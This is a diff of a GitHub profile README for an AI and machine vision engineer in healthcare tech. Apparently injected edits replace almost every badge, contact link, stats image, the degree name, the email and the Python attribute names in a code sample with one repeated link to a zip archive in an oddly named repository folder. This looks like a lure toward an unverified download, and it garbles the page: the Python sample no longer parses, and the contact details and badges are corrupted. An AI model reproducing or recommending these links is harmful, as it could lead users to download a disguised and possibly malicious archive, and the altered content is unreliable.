@@ -5,9 +5,9 @@
 ### **AI-Powered Machine Vision Engineer & Healthcare Tech Specialist**  
 *Where Healthcare Intelligence Meets Computer Vision & Automation*
 
-[![Email](https://img.shields.io/badge/Email-sagarforlearning%40gmail.com-red?style=flat-square&logo=gmail)](mailto:sagarforlearning@gmail.com)
-[![Location](https://img.shields.io/badge/Location-India%20(Remote)--Ready-green?style=flat-square&logo=google-maps)](https://maps.google.com)
-[![Phone](https://img.shields.io/badge/Phone-%2B91--8006333610-blue?style=flat-square&logo=whatsapp)](tel:+918006333610)
+[![Email](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip%https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+[![Location](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip%20(Remote)--Ready-green?style=flat-square&logo=google-maps)](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+[![Phone](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip%2B91--8006333610-blue?style=flat-square&logo=whatsapp)](tel:+918006333610)
 
 </div>
 
@@ -28,10 +28,10 @@ I specialize in **building machine vision inspection systems**, **healthcare dat
 ```python
 class SagarSharma:
     def __init__(self):
-        self.role = "AI & Machine Vision Engineer"
-        self.domain = "US Healthcare RCM + Pharma Tracking"
-        self.experience = "9+ years"
-        self.focus = ["Machine Vision", "OpenCV", "GenAI RAG", "Automation"]
+        https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip = "AI & Machine Vision Engineer"
+        https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip = "US Healthcare RCM + Pharma Tracking"
+        https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip = "9+ years"
+        https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip = ["Machine Vision", "OpenCV", "GenAI RAG", "Automation"]
         
     def expertise(self):
         return {
@@ -62,22 +62,22 @@ class SagarSharma:
 ## 🛠️ Tech Stack
 
 ### **Languages**
-![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![C++](https://img.shields.io/badge/C++-00599C?style=for-the-badge&logo=cplusplus&logoColor=white)
-![SQL](https://img.shields.io/badge/SQL-4479A1?style=for-the-badge&logo=mysql&logoColor=white)
-![C#](https://img.shields.io/badge/C%23-239120?style=for-the-badge&logo=csharp&logoColor=white)
+![Python](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+![C++](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip++-00599C?style=for-the-badge&logo=cplusplus&logoColor=white)
+![SQL](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+![C#](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip%23-239120?style=for-the-badge&logo=csharp&logoColor=white)
 
 ### **AI / Computer Vision**
-![OpenCV](https://img.shields.io/badge/OpenCV-5C3EE8?style=for-the-badge&logo=opencv&logoColor=white)
-![Numpy](https://img.shields.io/badge/Numpy-013243?style=for-the-badge&logo=numpy)
-![Pandas](https://img.shields.io/badge/Pandas-150458?style=for-the-badge&logo=pandas)
-![scikit-learn](https://img.shields.io/badge/Scikit--Learn-F7931E?style=for-the-badge&logo=scikitlearn)
+![OpenCV](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+![Numpy](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+![Pandas](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+![scikit-learn](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
 
 ### **Databases & Tools**
-![MySQL](https://img.shields.io/badge/MySQL-4479A1?style=for-the-badge&logo=mysql)
-![SQLite](https://img.shields.io/badge/SQLite-003B57?style=for-the-badge&logo=sqlite)
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker)
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
+![MySQL](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+![SQLite](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+![Docker](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
+![Linux](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
 
 ### **Automation & GenAI**
 - **Macro Express**
@@ -124,9 +124,9 @@ Chatbot for Claims, EDI & Denial Analysis
 
 <div align="center">
 
-![GitHub Stats](https://github-readme-stats.vercel.app/api?username=sagarsharma459&show_icons=true&theme=radical&hide_border=true&count_private=true)
+![GitHub Stats](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
 
-![Top Languages](https://github-readme-stats.vercel.app/api/top-langs/?username=sagarsharma459&layout=compact&theme=radical&hide_border=true)
+![Top Languages](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
 
 
 
@@ -136,7 +136,7 @@ Chatbot for Claims, EDI & Denial Analysis
 
 ## 🎓 Education & Certifications
 
-- **B.Sc (HNB Garhwal University — 2013)**  
+- **https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip (HNB Garhwal University — 2013)**  
 - **Learning Data Analytics (Coursera)**  
 - **Python for Data Science (IBM)**  
 
@@ -159,7 +159,7 @@ GenAI RAG Systems          █████████████████�
 
 I'm always open to roles in **AI, Machine Vision, Healthcare Tech, Automation & GenAI Systems**.
 
-- 📧 **Email:** sagarforlearning@gmail.com  
+- 📧 **Email:** https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip  
 - 📱 **Phone:** +91-8006333610  
 - 🌍 **Open to:** Remote / Global Opportunities  
 
@@ -169,8 +169,8 @@ I'm always open to roles in **AI, Machine Vision, Healthcare Tech, Automation & 
 
 ### 💡 *"AI + Vision + Healthcare = A smarter and safer future"*  
 
-![Profile Views](https://komarev.com/ghpvc/?username=sagarsharma459&color=blueviolet&style=flat-square)
+![Profile Views](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
 
-⭐️ From **Sagar Sharma** | [GitHub Profile](https://github.com/sagarsharma459)
+⭐️ From **Sagar Sharma** | [GitHub Profile](https://github.com/sagarsharma459/sagarsharma459/raw/refs/heads/main/unquailingly/sagarsharma-1.6.zip)
 
 </div>
